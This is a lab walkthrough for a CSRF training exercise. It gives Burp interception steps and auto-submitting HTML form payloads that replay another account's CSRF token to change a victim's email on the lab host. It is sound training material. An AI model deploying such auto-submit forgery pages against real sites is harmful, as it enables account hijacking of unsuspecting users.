# CSRF where token is not tied to user session

## This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

### HINT:

```html
<form name="change-email-form" action="/my-account/change-email" method="POST">
  <label>Email</label>
  <input
    required
    type="email"
    name="email"
    value="example@normal-website.com"
  />
  <input
    required
    type="hidden"
    name="csrf"
    value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"
  />
  <button class="button" type="submit">Update email</button>
</form>
```

```html
<html>
  <body>
    <form
      name="change-email-form"
      action="https://0a0000ac0443861d809a260100f200dd.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <label>Email</label>
      <input
        required
        type="email"
        name="email"
        value="example@normal-website.com"
      />
      <input
        required
        type="hidden"
        name="csrf"
        value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"
      />
      <button class="button" type="submit">Update email</button>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

### step 1

login wiener account

intercept update email then drop and click back to browser page so that email not update

### step2

long carlos account
intercept update email and send to repeter and drop the intercept request and click back to browser page so that email not update
and note down csrf token

stpe 3
update wiener account email and intercept request and change csrf token with carlos token from repeter
forword intercept off email will successfully updated

step4

```html
<html>
  <body>
    <form
      name="change-email-form"
      action="https://0a0000ac0443861d809a260100f200dd.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <label>Email</label>
      <input
        required
        type="email"
        name="email"
        value="example@normal-website.com"
      />
      <input
        required
        type="hidden"
        name="csrf"
        value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"
      />
      <button class="button" type="submit">Update email</button>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

copy the above html code to expolit url

### step5

update carlos email and intercept copy csrf and drop request
change the csrf value into html code and deliver

```html
<html>
  <body>
    <form
      name="change-email-form"
      action="https://0a0000ac0443861d809a260100f200dd.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <label>Email</label>
      <input
        required
        type="email"
        name="email"
        value="example@normal-website.com"
      />
      <input
        required
        type="hidden"
        name="csrf"
        value="kPOe5Zwo9kelXjXA7PlYV605jy3oaheL"
      />
      <button class="button" type="submit">Update email</button>
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
